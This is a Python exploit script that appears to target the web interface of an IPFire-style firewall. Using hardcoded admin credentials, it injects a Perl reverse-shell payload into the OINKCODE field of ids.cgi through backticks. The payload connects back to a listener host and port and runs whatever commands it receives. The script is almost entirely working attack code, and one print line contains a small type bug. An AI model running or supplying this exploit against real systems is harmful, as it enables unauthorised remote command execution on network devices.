import requests

ip = '172.16.1.155'
user = 'admin'
password = '1pF1@dm#2020'
port = 444
lport = 666
lhost = '172.16.1.112'

r = requests.get(f'https://{ip}:{port}/cgi-bin/pakfire.cgi', auth=(user, password), verify=False)

print("Check: " + r.status_code)

def generate():
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
            lhost +
            ":" +
            str(lport) +
            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
        )

payload = "perl -MIO -e \"{}\"".format(generate())


r_exploit = requests.post(
    f'https://{ip}:{port}/cgi-bin/ids.cgi',
    auth=(user, password),
    verify=False,
    headers={'Referer':f'https://{ip}:{port}/cgi-bin/ids.cgi'},
    data = {
        'ENABLE_SNORT_GREEN':'on',
        'ENABLESNORT':'on',
        'RULES':'registered',
        'OINKCODE':"`{}`".format(payload),
        'ACTION':'Download new ruleset',
        'ACTION2':'snort'
        }
    )


print(r_exploit)